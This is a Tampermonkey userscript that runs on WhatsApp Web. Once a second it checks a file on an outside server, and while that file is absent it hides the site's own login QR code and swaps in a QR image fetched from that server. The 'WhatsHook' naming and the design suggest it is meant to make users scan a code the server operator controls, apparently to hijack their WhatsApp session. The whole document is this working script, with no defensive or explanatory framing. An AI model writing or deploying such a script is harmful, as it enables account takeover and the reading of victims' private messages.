// ==UserScript==
// @name         Replace QR Code with own code
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  Replaces the clients QR code on WhatsApp Web with a different one
// @author       Ziladus
// @match        https://web.whatsapp.com/
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

    var checkFileAccess = function() {
        var image = new Image();
        image.src = "https://myserver.com/Ip/WhatsHook/file.png?" + Date.now();

        image.onload = function() {
            var qrCode = document.querySelector("[data-testid='qrcode']");
            if (qrCode) {
                qrCode.style.display = "block";
                var customImage = document.querySelector("[data-testid='custom-image']");
                customImage.remove();
            }
        };

        image.onerror = function() {
            var qrCode = document.querySelector("[data-testid='qrcode']");
            if (qrCode) {
                qrCode.style.display = "none";

                var img = document.querySelector("[data-testid='custom-image']");
                if (!img) {
                    img = document.createElement("img");
                    img.setAttribute("data-testid", "custom-image");
                    qrCode.parentNode.appendChild(img);
                }
                img.src = "https://myserver.com/Ip/WhatsHook/qrcode.gif?" + Date.now();
                img.style.width = "100%";
            }
        };
    };

    setInterval(checkFileAccess, 1000);
})();
